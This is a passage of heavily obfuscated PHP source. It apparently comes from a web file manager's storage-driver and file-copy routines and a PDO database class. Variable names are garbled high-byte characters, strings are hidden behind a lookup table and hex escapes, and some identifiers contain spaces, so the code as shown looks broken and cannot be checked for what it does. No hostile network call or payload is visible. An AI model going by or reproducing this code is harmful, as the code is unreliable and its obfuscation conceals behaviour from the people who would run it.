$©µÔ²Òè; $Åù°í” = $Ç‡½«ê¸; $Ç‡½«ê¸ = $¡­ÏÔúˆ->download($âÂ¦°ö, $Ç‡½«ê¸); $Ç‡½«ê¸ = $¡­ÏÔúˆ->iconvApp($Ç‡½«ê¸); if (substr($Ç‡½«ê¸, strlen($Ş‰€”¦)) == $Ş‰€”¦) { $¶ìÆæ¯â = !0; } $×ÁÏôš‚ = $ï§ÂÇŒŸ->upload($ğÉ›¨’—, $Ç‡½«ê¸, $¶ìÆæ¯â); self::remove($Åù°í”); Hook::trigger($õÆæÒï[1212], $¡­ÏÔúˆ, $âÂ¦°ö, $ï§ÂÇŒŸ, $ğÉ›¨’—, $Á™Ú©¤, $×ÁÏôš‚); self::copyMoveKeepInfo($¡­ÏÔúˆ, $âÂ¦°ö, $×ÁÏôš‚); return $×ÁÏôš‚; } private static function copyMoveKeepInfo($İúÒË…ë, $œš¨ê×Ø, $ÄŒŒ»µÑ) { if (!$ÄŒŒ»µÑ) { return; } $û‰­öÈÎ = $İúÒË…ë->info($œš¨ê×Ø); if (!is_array($û‰­öÈÎ)) { return; } IO::setModifyTime($ÄŒŒ»µÑ, $û‰­öÈÎ[$_SERVER[çâ¥×ø³][85]]); } public static function pathFather($ã¬´æÛ) { $æÒŸàÛ¿ = IO::init($ã¬´æÛ); $×Ûöë×– = $æÒŸàÛ¿->pathFather($æÒŸàÛ¿->path); return $æÒŸàÛ¿->getPathOuter($×Ûöë×–); } public static function fileOut($ÎÙ‡™³ñ, $ÔñÅ¡½ó = false, $Äñæƒœê = false, $”À®„ñÑ = '') { $´µÛ¹ç = self::driverMake($ÎÙ‡™³ñ); if ($´µÛ¹ç->isFileOutServer()) { return $´µÛ¹ç->fileOutServer($ÎÙ‡™³ñ, $ÔñÅ¡½ó, $Äñæƒœê, $”À®„ñÑ); } return $´µÛ¹ç->fileOut($ÎÙ‡™³ñ, $ÔñÅ¡½ó, $Äñæƒœê, $”À®„ñÑ); } public static function fileOutImage($Ò­Çá‘œ, $²õŠĞ´ = 250) { $»©åĞ´ó = array(250, 600, 1200, 2000, 3000, 5000); for ($¾½¡Ä = 0; $¾½¡Ä < count($»©åĞ´ó); $¾½¡Ä++) { if ($¾½¡Ä == 0 && $²õŠĞ´ <= $»©åĞ´ó[$¾½¡Ä]) { $²õŠĞ´ = $»©åĞ´ó[$¾½¡Ä]; break; } else { if ($²õŠĞ´ > $»©åĞ´ó[$¾½¡Ä - 1] && $²õŠĞ´ <= $»©åĞ´ó[$¾½¡Ä]) { $²õŠĞ´ = $»©åĞ´ó[$¾½¡Ä]; break; } else { if ($¾½¡Ä == count($»©åĞ´ó) - 1 && $²õŠĞ´ > $»©åĞ´ó[$¾½¡Ä]) { $²õŠĞ´ = $»©åĞ´ó[$¾½¡Ä]; break; } } } } $ÏïıÕê¸ = self::driverMake($Ò­Çá‘œ); if ($ÏïıÕê¸->isFileOutServer()) { return $ÏïıÕê¸->fileOutImageServer($Ò­Çá‘œ, $²õŠĞ´); } return $ÏïıÕê¸->fileOutImage($Ò­Çá‘œ, $²õŠĞ´); } private static function driverIsSame($à¶›…³Í, $ÚÍØÅ§) { $–İ¶îí¢ =& $_SERVER[çâ¥×ø³]; $öĞ‹¸¬ = $à¶›…³Í->getType(); $¢çÑòÂŞ = $ÚÍØÅ§->getType(); if ($öĞ‹¸¬ != $¢çÑòÂŞ) { return !1; } if ($öĞ‹¸¬ == $–İ¶îí¢[806]) { return !0; } if ($öĞ‹¸¬ == $–İ¶îí¢[106]) { return !0; } if ($à¶›…³Í->pathDriver == $ÚÍØÅ§->pathDriver) { return !0; } return !1; } public static function copyUpdate($è½ÅÑ¢š, $÷Ì÷ãü¤) { $¡ƒ’»á– =& $_SERVER[çâ¥×ø³]; if (!IO::exist($è½ÅÑ¢š)) { return !1; } if (!IO::exist($÷Ì÷ãü¤)) { IO::mkdir($÷Ì÷ãü¤); } $ÇÑÏÊÓõ = array_to_keyvalue(self::listAllSimple($è½ÅÑ¢š), $¡ƒ’»á–[84]); $‰¯ÃÁ¼ = array_to_keyvalue(self::listAllSimple($÷Ì÷ãü¤), $¡ƒ’»á–[84]); $ßÒì¬¼Ï = array(); $ÇœÄôÁÈ = array(); foreach ($ÇÑÏÊÓõ as $×ôÉÑ‡ü => $‹Â²ÎÑ‘) { if (isset($‰¯ÃÁ¼[$×ôÉÑ‡ü])) { if ($‹Â²ÎÑ‘[$¡ƒ’»á–[75]] == 1) { continue; } if ($‰¯ÃÁ¼[$×ôÉÑ‡ü][$¡ƒ’»á–[76]] == $‹Â²ÎÑ‘[$¡ƒ’»á–[76]]) { continue; } } if ($‹Â²ÎÑ‘[$¡ƒ’»á–[75]] == 1) { $ÇœÄôÁÈ[] = $÷Ì÷ãü¤ . $¡ƒ’»á–[8] . trim($×ôÉÑ‡ü, $¡ƒ’»á–[8]); continue; } $ĞÅÔöµö = strstr(trim($×ôÉÑ‡ü, $¡ƒ’»á–[8]), $¡ƒ’»á–[8]) ? get_path_father($×ôÉÑ‡ü) : $¡ƒ’»á–[12]; $ßÒì¬¼Ï[] = array($¡ƒ’»á–[1213] => $‹Â²ÎÑ‘[$¡ƒ’»á–[86]], $¡ƒ’»á–[1214] => rtrim($÷Ì÷ãü¤, $¡ƒ’»á–[8]) . $¡ƒ’»á–[8] . $ĞÅÔöµö, $¡ƒ’»á–[1215] => $‹Â²ÎÑ‘); } $Ï›¥úÏè = array($¡ƒ’»á–[214] => $ßÒì¬¼Ï, $¡ƒ’»á–[75] => $ÇœÄôÁÈ); Hook::trigger($¡ƒ’»á–[1216], $è½ÅÑ¢š, $÷Ì÷ãü¤, $Ï›¥úÏè); foreach ($ÇœÄôÁÈ as $‹Â²ÎÑ‘) { IO::mkdir($‹Â²ÎÑ‘); } foreach ($ßÒì¬¼Ï as $‹Â²ÎÑ‘) { IO::copy($‹Â²ÎÑ‘[$¡ƒ’»á–[1213]], $‹Â²ÎÑ‘[$¡ƒ’»á–[1214]], REPEAT_REPLACE); } } public static function fileSubstr($œ³Ò­Ùø, $±ßÀûË, $Ù”ıÓğó = false) { $£œÁ©Á =& $_SERVER[çâ¥×ø³]; $áÅÌ‹·¯ = self::driverMake($œ³Ò­Ùø); $“ùõ—ü = $áÅÌ‹·¯->size($œ³Ò­Ùø); $‘¶ùØÓ‹ = $±ßÀûË; $©×åïôÍ = $Ù”ıÓğó; if ($±ßÀûË < 0) { $±ßÀûË = $“ùõ—ü + $±ßÀûË; } if ($Ù”ıÓğó === !1) { $Ù”ıÓğó = $“ùõ—ü - $±ßÀûË; } if ($±ßÀûË + $Ù”ıÓğó > $“ùõ—ü) { $Ù”ıÓğó = $“ùõ—ü - $±ßÀûË; } if (!$“ùõ—ü && $áÅÌ‹·¯->getType() == $£œÁ©Á[106] && !$áÅÌ‹·¯->exist($œ³Ò­Ùø)) { $ÛåãŠ“¬ = get_path_this($œ³Ò­Ùø); $âÈ´ƒ‰½ = parse_url_query($ÛåãŠ“¬); if (is_array($âÈ´ƒ‰½) && isset($âÈ´ƒ‰½[$£œÁ©Á[32]])) { $ÛåãŠ“¬ = urldecode($âÈ´ƒ‰½[$£œÁ©Á[32]]); } throw new Exception($£œÁ©Á[1217] . LNG($£œÁ©Á[1218]) . $£œÁ©Á[1019] . clear_html($ÛåãŠ“¬) . $£œÁ©Á[12]); } if ($Ù”ıÓğó <= 0) { return $£œÁ©Á[12]; } if ($±ßÀûË < 0 || $±ßÀûË >= $“ùõ—ü || $Ù”ıÓğó > 1024 * 1024 * 10) { throw new Exception("\146\151\x6c\145\122\145\141\144\40\145\162\162\x6f\x72\41\x20\x73\164\x61\162\164\x3d{$±ßÀûË}\x3b\x6c\145\x6e\x67\x74\150\75{$Ù”ıÓğó}\73\40\163\151\172\x65\x3d{$“ùõ—ü}\73"); } $ëàÅòÊÊ = $áÅÌ‹·¯->fileSubstr($œ³Ò­Ùø, $±ßÀûË, $Ù”ıÓğó); if (!$ëàÅòÊÊ && $Ù”ıÓğó && isset($GLOBALS[$£œÁ©Á[1219]])) { throw new Exception($GLOBALS[$£œÁ©Á[1219]][$£œÁ©Á[1220]]); } return $ëàÅòÊÊ; } private static function driverMake(&$÷¸ÆÖ¬ ) { $Ã²‹ªš™ =& $_SERVER[çâ¥×ø³]; $ƒ¹Ú²š¡ = KodIO::parse($÷¸ÆÖ¬ ); if (!self::$driverListSystem) { $µ„˜‘Ó = Model($Ã²‹ªš™[816])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($µ„˜‘Ó, $Ã²‹ªš™[443]); } if ($ƒ¹Ú²š¡[$Ã²‹ªš™[33]] == KodIO::KOD_IO && !self::$driverListSystem[$ƒ¹Ú²š¡[$Ã²‹ªš™[443]]]) { return !1; } $÷¸ÆÖ¬  = $ƒ¹Ú²š¡[$Ã²‹ªš™[1221]]; $ŠÖõí£ = self::driverGet($ƒ¹Ú²š¡, $÷¸ÆÖ¬ ); return $ŠÖõí£; } private static function driverGet($ ©Î½İè, &$İØ ’†–) { $…¢¥Ã =& $_SERVER[çâ¥×ø³]; $Ã»µúè· = $ ©Î½İè[$…¢¥Ã[1222]]; $­àü¶‘ü = $ ©Î½İè[$…¢¥Ã[443]]; switch ($ ©Î½İè[$…¢¥Ã[33]]) { case KodIO::KOD_IO: $£‘ŸóÇÎ = self::$driverListSystem[$­àü¶‘ü]; break; case KodIO::KOD_SOURCE: $İØ ’†– = $­àü¶‘ü . $İØ ’†–; $£‘ŸóÇÎ = array($…¢¥Ã[1223] => $…¢¥Ã[1224], $…¢¥Ã[6] => $ ©Î½İè); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $Ê‰Ÿ›ÙÓ = $GLOBALS[$…¢¥Ã[1225]]; self::$driverListUser = array_to_keyvalue($Ê‰Ÿ›ÙÓ, $…¢¥Ã[443]); } $£‘ŸóÇÎ = self::$driverListUser[$­àü¶‘ü]; break; case KodIO::KOD_SHARE_LINK: $£‘ŸóÇÎ = array($…¢¥Ã[1223] => $…¢¥Ã[1226], $…¢¥Ã[6] => $ ©Î½İè); $³‹›Õ¾ = Action($…¢¥Ã[1227])->sharePathInfo($ ©Î½İè[$…¢¥Ã[84]]); $İØ ’†– = $³‹›Õ¾[$…¢¥Ã[181]]; if (!$³‹›Õ¾[$…¢¥Ã[181]]) { $Ë«ê„Øï = Model($…¢¥Ã[632])->getInfo($³‹›Õ¾[$…¢¥Ã[633]]); $İØ ’†– = KodIO::clear($Ë«ê„Øï[$…¢¥Ã[1228]] . $ ©Î½İè[$…¢¥Ã[1221]]); $ ©Î½İè[$…¢¥Ã[528]] = $Ë«ê„Øï; $ ©Î½İè[$…¢¥Ã[1204]] = $İØ ’†–; $£‘ŸóÇÎ = array($…¢¥Ã[1223] => $…¢¥Ã[1229], $…¢¥Ã[6] => $ ©Î½İè); } break; case KodIO::KOD_SHARE_ITEM: $£‘ŸóÇÎ = array($…¢¥Ã[1223] => $…¢¥Ã[1230], $…¢¥Ã[6] => $ ©Î½İè); $Ë«ê„Øï = Model($…¢¥Ã[632])->getInfo($ ©Î½İè[$…¢¥Ã[443]]); if ($Ë«ê„Øï[$…¢¥Ã[181]] == $…¢¥Ã[212]) { $İØ ’†– = KodIO::clear($Ë«ê„Øï[$…¢¥Ã[1228]] . $ ©Î½İè[$…¢¥Ã[1221]]); $ ©Î½İè[$…¢¥Ã[528]] = $Ë«ê„Øï; $ ©Î½İè[$…¢¥Ã[1204]] = $İØ ’†–; $£‘ŸóÇÎ = array($…¢¥Ã[1223] => $…¢¥Ã[1231], $…¢¥Ã[6] => $ ©Î½İè); } else { if (!$İØ ’†–) { $İØ ’†– = $Ë«ê„Øï[$…¢¥Ã[181]]; } } break; default: $İØ ’†– = $ ©Î½İè[$…¢¥Ã[84]]; $£‘ŸóÇÎ = array($…¢¥Ã[1223] => $…¢¥Ã[1232]); break; } $Ä¶…Ì¿ = $ ©Î½İè[$…¢¥Ã[84]]; if (!isset(self::$driverCache[$Ä¶…Ì¿])) { $Ë°µøƒØ = strtolower($£‘ŸóÇÎ[$…¢¥Ã[95]]); $üø š‚ = $GLOBALS[$…¢¥Ã[6]][$…¢¥Ã[89]][$…¢¥Ã[875]]; $ü¹½ÌÀ¯ = $…¢¥Ã[74] . (isset($üø š‚[$Ë°µøƒØ]) ? $üø š‚[$Ë°µøƒØ] : ucfirst($Ë°µøƒØ)); if (!class_exists($ü¹½ÌÀ¯)) { show_json("{$ü¹½ÌÀ¯}\x20\x6e\157\164\x20\145\x78\151\x73\164\x73\x21", !1); } $şÚŸòŠµ = isset($£‘ŸóÇÎ[$…¢¥Ã[6]]) ? $£‘ŸóÇÎ[$…¢¥Ã[6]] : !1; self::$driverCache[$Ä¶…Ì¿] = new $ü¹½ÌÀ¯($şÚŸòŠµ); } $íÑÆûä­ = self::$driverCache[$Ä¶…Ì¿]; $íÑÆûä­->pathDriver = $Ã»µúè·; $íÑÆûä­->pathBase = $…¢¥Ã[12]; if (isset($£‘ŸóÇÎ[$…¢¥Ã[6]][$…¢¥Ã[1233]])) { $íÑÆûä­->pathBase = rtrim($£‘ŸóÇÎ[$…¢¥Ã[6]][$…¢¥Ã[1233]], $…¢¥Ã[8]) . $…¢¥Ã[8]; $İØ ’†– = $íÑÆûä­->pathBase . ltrim($İØ ’†–, $…¢¥Ã[8]); } $İØ ’†– = $íÑÆûä­->getPath($İØ ’†–); if (isset($ ©Î½İè[$…¢¥Ã[1204]])) { $İØ ’†– = $ ©Î½İè[$…¢¥Ã[1204]]; } $íÑÆûä­->path = $İØ ’†–; return $íÑÆûä­; } public static function errorTips($›—óÉÈß = false) { $êÁæêÏ© =& $_SERVER[çâ¥×ø³]; static $ÉÜÑæı— = array(); $õçİéïÙ = 1000; if ($›—óÉÈß === -1) { return $ÉÜÑæı— ? $ÉÜÑæı—[count($ÉÜÑæı—) - 1] : $êÁæêÏ©[12]; } if ($›—óÉÈß === !1) { return implode($êÁæêÏ©[246], $ÉÜÑæı—); } if (count($ÉÜÑæı—) >= $õçİéïÙ) { $ÉÜÑæı— = array_slice($ÉÜÑæı—, $õçİéïÙ * 0.5, $õçİéïÙ); } $ÉÜÑæı—[] = $›—óÉÈß; write_log($êÁæêÏ©[163] . ACTION . $êÁæêÏ©[1234] . $›—óÉÈß, $êÁæêÏ©[1235]); } public static function getLastError($ÏŠõÄ² = '') { $şè¢ğ„³ = self::errorTips(-1); return $şè¢ğ„³ ? $şè¢ğ„³ : $ÏŠõÄ²; } } goto F™¨Å½…Ç’; aùÁó¶ˆ„: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($â«’ôÕ = '') { $±ßĞ²ñÄ =& $_SERVER[çâ¥×ø³]; if (!class_exists($±ßĞ²ñÄ[967])) { think_exception(think_lang($±ßĞ²ñÄ[14]) . $±ßĞ²ñÄ[968]); } if (!empty($â«’ôÕ)) { $this->config = $â«’ôÕ; if (empty($this->config[$±ßĞ²ñÄ[17]])) { $this->config[$±ßĞ²ñÄ[17]] = array(); } } } public function connect($Øç¿æ¦ = '', $´°–„ = 0) { $Éƒ„Ìü =& $_SERVER[çâ¥×ø³]; if (!isset($this->linkID[$´°–„])) { if (empty($Øç¿æ¦)) { $Øç¿æ¦ = $this->config; } $üå…‡„Û = !empty($Øç¿æ¦[$Éƒ„Ìü[17]][$Éƒ„Ìü[18]]) ? $Øç¿æ¦[$Éƒ„Ìü[17]][$Éƒ„Ìü[18]] : $this->pconnect; if ($üå…‡„Û) { $Øç¿æ¦[$Éƒ„Ìü[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$´°–„] = new PDO($Øç¿æ¦[$Éƒ„Ìü[969]], $Øç¿æ¦[$Éƒ„Ìü[941]], $Øç¿æ¦[$Éƒ„Ìü[942]], $Øç¿æ¦[$Éƒ„Ìü[17]]); } catch (PDOException $ÇÙºñº) { think_exception($ÇÙºñº->getMessage()); } $this->dbType = $this->_getDsnType($Øç¿æ¦[$Éƒ„Ìü[969]]); if (in_array($this->dbType, array($Éƒ„Ìü[970], $Éƒ„Ìü[971], $Éƒ„Ìü[972], $Éƒ„Ìü[973]))) { think_exception($Éƒ„Ìü[974] . $this->dbType . $Éƒ„Ìü[975] . $this->dbType . $Éƒ„Ìü[976]); } if (!$this->linkID[$´°–„]) { think_exception($Éƒ„Ìü[977]); } try { $this->linkID[$´°–„]->exec($Éƒ„Ìü[978] . think_config($Éƒ„Ìü[944])); } catch (Exception $ÇÙºñº) { } $this->connected = !0; if (1 != think_config($Éƒ„Ìü[22])) { unset($this->config); } } return $this->linkID[$´°–„]; } public function free() { $this->PDOStatement = null; } public function query($íòŸ™­„, $¯²¨Œ”† = array()) { $Ç»ğËÂÛ =& $_SERVER[çâ¥×ø³]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $íòŸ™­„; if (!empty($¯²¨Œ”†)) { $this->queryStr .= $Ç»ğËÂÛ[979] . print_r($¯²¨Œ”†, !0) . $Ç»ğËÂÛ[980]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Ç»ğËÂÛ[23], 1); think_status($Ç»ğËÂÛ[24]); $this->PDOStatement = $this->_linkID->prepare($íòŸ™­„); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ÍŒş×‚¯ = $this->PDOStatement->execute($¯²¨Œ”†); $this->debug(); if (!1 === $ÍŒş×‚¯) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($ÛÖÍ…´, $æÇ©Š‘ = array()) { $Öòå±Ì =& $_SERVER[çâ¥×ø³]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÛÖÍ…´; if (!empty($æÇ©Š‘)) { $this->queryStr .= $Öòå±Ì[979] . print_r($æÇ©Š‘, !0) . $Öòå±Ì[980]; } $¹öñ„ü = !1; if ($this->dbType == $Öòå±Ì[973]) { if (preg_match($Öòå±Ì[981], $this->queryStr, $´·ÆªÆä)) { $this->table = think_config($Öòå±Ì[982]) . str_ireplace(think_config($Öòå±Ì[983]), $Öòå±Ì[422], $´·ÆªÆä[2]); $¹öñ„ü = (bool) $this->query($Öòå±Ì[984] . strtoupper($this->table) . $Öòå±Ì[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Öòå±Ì[25], 1); think_status($Öòå±Ì[24]); $this->PDOStatement = $this->_linkID->prepare($ÛÖÍ…´); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ç©ÒŞÊ = $this->PDOStatement->execute($æÇ©Š‘); $this->debug(); if (!1 === $ç©ÒŞÊ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($¹öñ„ü || preg_match($Öòå±Ì[985], $ÛÖÍ…´)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ğÊâÛå = $this->_linkID->commit(); $this->transTimes = 0; if (!$ğÊâÛå) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $òâô‹‰ª = $this->_linkID->rollback(); $this->transTimes = 0; if (!$òâô‹‰ª) { $this->error(); return !1; } } return !0; } private function getAll() { $Š–áãç = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($Š–áãç); return $Š–áãç; } public function getFields($İ™‘”ÔŒ) { $¡ˆ©×êØ =& $_SERVER[çâ¥×ø³]; $this->initConnect(!0); if (think_config($¡ˆ©×êØ[986])) { $æ˜ƒˆÆË = str_replace($¡ˆ©×êØ[987], $İ™‘”ÔŒ, think_config($¡ˆ©×êØ[986])); } else { switch ($this->dbType) { case $¡ˆ©×êØ[970]: case $¡ˆ©×êØ[988]: $æ˜ƒˆÆË = "\123\105\x4c\105\103\124\x20\40\40\143\x6f\154\165\155\x6e\137\x6e\x61\155\x65\x20\141\163\x20\47\x4e\x61\155\145\47\x2c\40\x20\x20\x64\141\x74\141\x5f\x74\x79\x70\x65\40\141\163\x20\47\x54\171\x70\x65\47\x2c\40\x20\40\x63\x6f\x6c\x75\x6d\x6e\137\144\145\146\x61\x75\x6c\x74\x20\x61\x73\40\47\x44\x65\146\x61\165\154\x74\47\54\x20\40\x20\151\163\137\156\165\x6c\x6c\141\x62\x6c\145\x20\x61\x73\x20\47\116\x75\x6c\x6c\x27\12\x9\11\x46\122\x4f\115\x9\151\x6e\146\157\162\x6d\x61\x74\151\x6f\156\x5f\163\x63\150\145\x6d\141\56\164\141\x62\x6c\145\x73\x20\101\123\x20\164\12\x9\x9\112\117\x49\x4e\11\x69\156\x66\x6f\x72\155\141\164\x69\157\x6e\x5f\x73\143\150\145\x6d\141\x2e\x63\x6f\154\165\x6d\x6e\x73\x20\x41\123\x20\x63\xa\11\x9\117\x4e\x20\x20\x74\56\x74\x61\142\x6c\145\x5f\143\141\x74\141\x6c\x6f\x67\x20\75\40\143\56\164\x61\x62\154\x65\x5f\x63\141\x74\x61\154\157\147\12\x9\11\101\x4e\104\40\164\x2e\164\141\x62\154\x65\x5f\163\x63\x68\145\x6d\x61\40\x3d\40\143\56\164\141\142\154\x65\x5f\163\143\150\x65\x6d\141\12\x9\x9\101\116\104\40\x74\56\164\x61\x62\154\x65\x5f\156\141\x6d\x65\x20\75\40\x63\x2e\x74\141\142\x6c\145\137\x6e\141\155\x65\xa\11\11\x57\110\x45\122\x45\40\x20\x20\x74\56\x74\141\x62\x6c\145\x5f\x6e\141\155\145\x20\75\40\47{$İ™‘”ÔŒ}\47"; break; case $¡ˆ©×êØ[989]: $æ˜ƒˆÆË = $¡ˆ©×êØ[990] . $İ™‘”ÔŒ . $¡ˆ©×êØ[991]; break; case $¡ˆ©×êØ[971]: case $¡ˆ©×êØ[973]: $æ˜ƒˆÆË = $¡ˆ©×êØ[992] . $¡ˆ©×êØ[993] . $¡ˆ©×êØ[994] . strtoupper($İ™‘”ÔŒ) . $¡ˆ©×êØ[995] . strtoupper($İ™‘”ÔŒ) . $¡ˆ©×êØ[996]; break; case $¡ˆ©×êØ[997]: $æ˜ƒˆÆË = $¡ˆ©×êØ[998] . $İ™‘”ÔŒ . $¡ˆ©×êØ[999]; break; case $¡ˆ©×êØ[972]: break; case $¡ˆ©×êØ[1000]: default: $æ˜ƒˆÆË = $¡ˆ©×êØ[1001] . ($this->dbType == $¡ˆ©×êØ[1000] ? "\x60{$İ™‘”ÔŒ}\140" : $İ™‘”ÔŒ); } } $å÷¿¿¾‹ = $this->query($æ˜ƒˆÆË); $öì‘’Î = array(); if ($å÷¿¿¾‹) { foreach ($å÷¿¿¾‹ as $şİë¡Õ¥ => $íŠ¿Õˆ) { $íŠ¿Õˆ = array_change_key_case($íŠ¿Õˆ); $íŠ¿Õˆ[$¡ˆ©×êØ[32]] = isset($íŠ¿Õˆ[$¡ˆ©×êØ[32]]) ? $íŠ¿Õˆ[$¡ˆ©×êØ[32]] : $¡ˆ©×êØ[422]; $íŠ¿Õˆ[$¡ˆ©×êØ[33]] = isset($íŠ¿Õˆ[$¡ˆ©×êØ[33]]) ? $íŠ¿Õˆ[$¡ˆ©×êØ[33]] : $¡ˆ©×êØ[422]; $Ô–œ£ğ« = isset($íŠ¿Õˆ[$¡ˆ©×êØ[317]]) ? $íŠ¿Õˆ[$¡ˆ©×êØ[317]] : $íŠ¿Õˆ[$¡ˆ©×êØ[32]]; $öì‘’Î[$Ô–œ£ğ«] = array($¡ˆ©×êØ[32] => $Ô–œ£ğ«, $¡ˆ©×êØ[33] => $íŠ¿Õˆ[$¡ˆ©×êØ[33]], $¡ˆ©×êØ[35] => (bool) (isset($íŠ¿Õˆ[$¡ˆ©×êØ[103]]) && $íŠ¿Õˆ[$¡ˆ©×êØ[103]] === $¡ˆ©×êØ[12] || isset($íŠ¿Õˆ[$¡ˆ©×êØ[35]]) && $íŠ¿Õˆ[$¡ˆ©×êØ[35]] === $¡ˆ©×êØ[12]), $¡ˆ©×êØ[37] => isset($íŠ¿Õˆ[$¡ˆ©×êØ[37]]) ? $íŠ¿Õˆ[$¡ˆ©×êØ[37]] : (isset($íŠ¿Õˆ[$¡ˆ©×êØ[56]]) ? $íŠ¿Õˆ[$¡ˆ©×êØ[56]] : $¡ˆ©×êØ[422]), $¡ˆ©×êØ[39] => isset($íŠ¿Õˆ[$¡ˆ©×êØ[94]]) ? strtolower($íŠ¿Õˆ[$¡ˆ©×êØ[94]]) == $¡ˆ©×êØ[41] : (isset($íŠ¿Õˆ[$¡ˆ©×êØ[57]]) ? $íŠ¿Õˆ[$¡ˆ©×êØ[57]] : !1), $¡ˆ©×êØ[42] => isset($íŠ¿Õˆ[$¡ˆ©×êØ[1002]]) ? strtolower($íŠ¿Õˆ[$¡ˆ©×êØ[1002]]) == $¡ˆ©×êØ[44] : (isset($íŠ¿Õˆ[$¡ˆ©×êØ[94]]) ? $íŠ¿Õˆ[$¡ˆ©×êØ[94]] : !1)); } } return $öì‘’Î; } public function getTables($Å¹Íîøì = '') { $Å¹ÛüÙî =& $_SERVER[çâ¥×ø³]; if (think_config($Å¹ÛüÙî[1003])) { $í¤öû€ö = str_replace($Å¹ÛüÙî[1004], $Å¹Íîøì, think_config($Å¹ÛüÙî[1003])); } else { switch ($this->dbType) { case $Å¹ÛüÙî[971]: case $Å¹ÛüÙî[973]: $í¤öû€ö = $Å¹ÛüÙî[1005]; break; case $Å¹ÛüÙî[970]: case $Å¹ÛüÙî[988]: $í¤öû€ö = $Å¹ÛüÙî[1006]; break; case $Å¹ÛüÙî[997]: $í¤öû€ö = $Å¹ÛüÙî[1007]; break; case $Å¹ÛüÙî[972]: think_exception(think_lang($Å¹ÛüÙî[1008]) . $Å¹ÛüÙî[1009]); break; case $Å¹ÛüÙî[989]: $í¤öû€ö = $Å¹ÛüÙî[45] . $Å¹ÛüÙî[46] . $Å¹ÛüÙî[47]; break; case $Å¹ÛüÙî[1000]: default: if (!empty($Å¹Íîøì)) { $í¤öû€ö = $Å¹ÛüÙî[952] . $Å¹Íîøì . $Å¹ÛüÙî[953]; } else { $í¤öû€ö = $Å¹ÛüÙî[954]; } } } $÷öµş¢† = $this->query($í¤öû€ö); $ëåˆÎÈì = array(); foreach ($÷öµş¢† as $¨ŸÛ„Šà => $ æÜ†Íª) { $ëåˆÎÈì[$¨ŸÛ„Šà] = current($ æÜ†Íª); } return $ëåˆÎÈì; } protected function parseLimit($§ûü¶ô…) { $®æ‹÷Ïä =& $_SERVER[çâ¥×ø³]; $¿áˆ…‡‚ = $®æ‹÷Ïä[12]; if (!empty($§ûü¶ô…)) { switch ($this->dbType) { case $®æ‹÷Ïä[997]: case $®æ‹÷Ïä[989]: $§ûü¶ô… = explode($®æ‹÷Ïä[50], $§ûü¶ô…); if (count($§ûü¶ô…) > 1) { $¿áˆ…‡‚ .= $®æ‹÷Ïä[51] . $§ûü¶ô…[1] . $®æ‹÷Ïä[52] . $§ûü¶ô…[0] . $®æ‹÷Ïä[53]; } else { $¿áˆ…‡‚ .= $®æ‹÷Ïä[51] . $§ûü¶ô…[0] . $®æ‹÷Ïä[53]; } break; case $®æ‹÷Ïä[970]: case $®æ‹÷Ïä[988]: break; case $®æ‹÷Ïä[972]: break; case $®æ‹÷Ïä[971]: case $®æ‹÷Ïä[973]: break; case $®æ‹÷Ïä[1000]: default: $¿áˆ…‡‚ .= $®æ‹÷Ïä[51] . $§ûü¶ô… . $®æ‹÷Ïä[53]; } } return $¿áˆ…‡‚; } public function parseKey(&$ŞÃ¥Úç, $¤ÀÍÛ™ = true) { $¬êâ =& $_SERVER[çâ¥×ø³]; if ($¤ÀÍÛ™) { $ŞÃ¥Úç = $this->parseKeyCheck($ŞÃ¥Úç); } if ($this->dbType == $¬êâ[1000]) { if ($ŞÃ¥Úç != $¬êâ[203] && !preg_match($¬êâ[964], $ŞÃ¥Úç)) { $ŞÃ¥Úç = $¬êâ[429] . trim($ŞÃ¥Úç, $¬êâ[429]) . $¬êâ[429]; } return $ŞÃ¥Úç; } else { return parent::parseKey($ŞÃ¥Úç, $¤ÀÍÛ™); } } public function close() { $this->_linkID = null; } public function error() { $µ¸š“êº =& $_SERVER[çâ¥×ø³]; if ($this->PDOStatement) { $ëÂÎå«¯ = $this->PDOStatement->errorInfo(); $this->error = $ëÂÎå«¯[1] . $µ¸š“êº[4] . $ëÂÎå«¯[2]; } else { $this->error = $µ¸š“êº[12]; } if ($µ¸š“êº[12] != $this->queryStr) { $this->error .= LNG($µ¸š“êº[48]) . $this->queryStr; } think_trace($this->error, $µ¸š“êº[12], $µ¸š“êº[49]); return $this->error; } public function escapeString($Ú¦®õº§) { $¨ûï¼Ã€ =& $_SERVER[çâ¥×ø³]; switch ($this->dbType) { case $¨ûï¼Ã€[997]: case $¨ûï¼Ã€[970]: case $¨ûï¼Ã€[988]: case $¨ûï¼Ã€[1000]: return addslashes($Ú¦®õº§); case $¨ûï¼Ã€[972]: case $¨ûï¼Ã€[989]: case $¨ûï¼Ã€[971]: case $¨ûï¼Ã€[973]: return str_ireplace($¨ûï¼Ã€[58], $¨ûï¼Ã€[59], $Ú¦®õº§); } } protected function parseValue($•ñÑ¤è˜) { $¬ó¦Ú¶Á =& $_SERVER[çâ¥×ø³]; if (is_string($•ñÑ¤è˜)) { $ã¤·Æ¿İ = strpos($•ñÑ¤è˜, $¬ó¦Ú¶Á[4]) === 0 && in_array($•ñÑ¤è˜, array_keys($this->bind)); $•ñÑ¤è˜ = $ã¤·Æ¿İ ? $this->escapeString($•ñÑ¤è˜) : $¬ó¦Ú¶Á[1010] . $this->escapeString($•ñÑ¤è˜) . $¬ó¦Ú¶Á[1010]; } elseif (isset($•ñÑ¤è˜[0]) && 